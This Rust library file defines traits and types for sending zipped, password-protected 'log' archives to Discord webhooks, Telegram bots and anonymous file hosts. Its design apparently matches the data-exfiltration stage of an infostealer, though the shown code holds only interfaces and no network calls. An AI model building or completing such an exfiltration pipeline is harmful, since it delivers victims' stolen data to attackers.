#![no_std]

extern crate alloc;
pub mod discord_webhook;
pub mod external_upload;
pub mod fallback;
pub mod gofile;
pub mod size_fallback;
pub mod size_limit;
pub mod telegram_bot;
pub mod tmpfiles;

use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::Collector;
use derive_new::new;
use zip::ZipArchive;

#[derive(Debug)]
pub enum SendError {
    Network,
    UnsupportedLogFile,
    LogFileTooBig,
}

/// Represents the content of a log file to be sent or processed.
#[derive(Clone)]
pub enum LogContent {
    /// A tuple containing:
    /// - A URL pointing to a `.zip` log archive.
    /// - The size of the log file in bytes.
    ExternalLink((String, usize)),

    /// The raw bytes of a `.zip` log archive.
    ZipArchive(Vec<u8>),
}

/// Represents a named log file with content.
#[derive(new, Clone)]
pub struct LogFile {
    /// The name of the log file, including its extension.
    name: Arc<str>,

    /// The content of the log file.
    content: LogContent,
}

impl LogFile {
    /// Returns a new `LogFile` with the same name but new content.
    pub fn modify_content(&self, new_content: LogContent) -> Self {
        Self {
            name: self.name.clone(),
            content: new_content,
        }
    }
}

impl From<Vec<u8>> for LogContent {
    fn from(value: Vec<u8>) -> Self {
        LogContent::ZipArchive(value)
    }
}

impl From<ZipArchive> for LogContent {
    fn from(value: ZipArchive) -> Self {
        LogContent::ZipArchive(value.create())
    }
}

/// A trait for sending log files to a destination service.
pub trait LogSender: Clone {
    /// Sends a log file to the destination service.
    ///
    /// # Parameters
    ///
    /// - `log_file`: A [`LogFile`] struct representing the log file to send.
    /// - `password`: An [`Option<String>`] that specifies the password for the archive, if it is password-protected.
    /// - `collector`: A type that implements the [`Collector`] trait, providing log-related metadata or additional context.
    ///
    /// # Returns
    ///
    /// - `Result<(), SendError>`: Returns `Ok(())` if the log was sent successfully, or a [`SendError`] if the operation failed.
    fn send<P, C>(
        &self,
        log_file: LogFile,
        password: Option<P>,
        collector: &C,
    ) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector;
}

/// An extension trait for [`LogSender`] that provides convenience methods.
///
/// This trait adds utility functionality to types that implement [`LogSender`].
pub trait LogSenderExt: LogSender {
    /// Sends a zipped archive of logs to the destination service.
    ///
    /// # Parameters
    ///
    /// - `archive`: A [`ZipArchive`] reference, representing the zipped logs to be sent.
    /// - `collector`: A type that implements the [`Collector`] trait, providing log-related metadata or additional context.
    ///
    /// # Returns
    ///
    /// - `Result<(), SendError>`: Returns `Ok(())` if the log was sent successfully, or a [`SendError`] if the operation failed.
    ///
    /// # Notes
    ///
    /// This method automatically extracts the password from the archive if one is set,
    /// and converts the archive into a [`LogContent::ZipArchive`].
    fn send_archive<A, C>(
        &self,
        name: Arc<str>,
        archive: A,
        collector: &C,
    ) -> Result<(), SendError>
    where
        A: AsRef<ZipArchive>,
        C: Collector;
}

impl<T: LogSender> LogSenderExt for T {
    fn send_archive<A, C>(&self, name: Arc<str>, archive: A, collector: &C) -> Result<(), SendError>
    where
        A: AsRef<ZipArchive>,
        C: Collector,
    {
        let archive = archive.as_ref();

        let password = archive.get_password();
        let archive = archive.create();

        self.send(LogFile::new(name, archive.into()), password, collector)
    }
}
